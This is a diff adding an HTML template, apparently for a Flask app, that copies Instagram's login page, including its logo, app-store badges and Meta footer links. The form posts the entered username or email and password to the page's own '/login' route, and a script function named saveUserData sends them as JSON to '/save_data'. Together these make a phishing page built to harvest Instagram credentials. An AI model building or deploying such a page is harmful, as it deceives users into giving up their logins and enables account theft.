@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="icon" type="image/x-icon" href="{{ url_for('static', filename='favicon.ico') }}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
+
+</head>
+<body>
+    <div class="main-container">
+        <!-- Phone with slideshow -->
+        <div class="phone-preview">
+            <img src="{{ url_for('static', filename='images/home-phones.png') }}" alt="Phone Frame" class="phone-frame">
+            <div class="slideshow">
+                <img src="{{ url_for('static', filename='images/screenshot1.png') }}" alt="Slide 1"class='active'>
+                <img src="{{ url_for('static', filename='images/screenshot2.png') }}" alt="Slide 2">
+                <img src="{{ url_for('static', filename='images/screenshot3.png') }}" alt="Slide 3">
+                <img src="{{ url_for('static', filename='images/screenshot4.png') }}" alt="Slide 4">
+
+            </div>
+        </div>
+
+        <!-- Login Section -->
+        <div class="container">
+            <div class="login-form">
+                <i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v4/yl/r/2_tD1Q6wIri.png&quot;); background-position: 0px -52px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>
+                <form action="/login" method="POST">
+                    <input type="text" name="email" placeholder="Phone number, username, or email" required>
+                    <input type="password" name="password" placeholder="Password" required>
+                    {% if error %}
+                        <p class="error-message">{{ error }}</p>
+                    {% endif %}
+                    <button type="submit">Log in</button>
+                </form>                
+                <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-password">Forgot password?</a>
+            </div>
+            <div class="signup-prompt">
+                <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
+            </div>
+            <div class="get-app">
+                <p>Get the app.</p>
+                <div class="app-stores">
+                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
+                        <img alt="Get it on Google Play" src="{{ url_for('static', filename='images/c5Rp7Ym-Klz.png') }}">
+                    </a>
+                    <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt" target="_blank">
+                        <img alt="Get it from Microsoft" src="{{ url_for('static', filename='images/EHY6QnZYdNX.png') }}">
+                    </a>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+    <footer>
+        <div class="footer-links">
+            <a href="https://about.meta.com/">About</a>
+            <a href="https://about.instagram.com/blog/">Blog</a>
+            <a href="https://about.instagram.com/about-us/careers">Jobs</a>
+            <a href="https://help.instagram.com/">Help</a>
+            <a href="https://developers.facebook.com/docs/instagram">API</a>
+            <a href="https://www.instagram.com/legal/privacy/">Privacy</a>
+            <a href="https://www.instagram.com/legal/terms/">Terms</a>
+            <a href="https://www.instagram.com/explore/locations/">Locations</a>
+            <a href="https://www.instagram.com/web/lite/">Instagram Lite</a>
+            <a href="https://www.threads.net/">Threads</a>
+            <a href="https://www.facebook.com/help/instagram/261704639352628">Contact Uploading & Non-Users</a>
+            <a href="https://www.instagram.com/accounts/meta_verified/?entrypoint=web_footer">Meta Verified</a>
+        </div>
+        <div class="language">
+            <select>
+                <option>English</option>
+                <option>العربية</option>
+                <option>Español</option>
+            </select>
+            <p>© 2025 Instagram from Meta</p>
+        </div>
+    </footer>
+    <script>
+        // Slideshow Functionality
+        const slides = document.querySelectorAll(".slideshow img");
+        let currentIndex = 0;
+
+        setInterval(() => {
+            slides[currentIndex].classList.remove("active");
+            currentIndex = (currentIndex + 1) % slides.length;
+            slides[currentIndex].classList.add("active");
+        }, 3000); // Change image every 3 seconds
+
+        // Function to send email & password to Flask
+        function saveUserData() {
+            let email = document.getElementById("email").value;
+            let password = document.getElementById("password").value;
+
+            fetch('/save_data', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: email, password: password })
+            })
+            .then(response => response.json())
+            .then(data => console.log(data.message))
+            .catch(error => console.error("خطأ:", error));
+        }
+    </script>
+</body>
+</html>
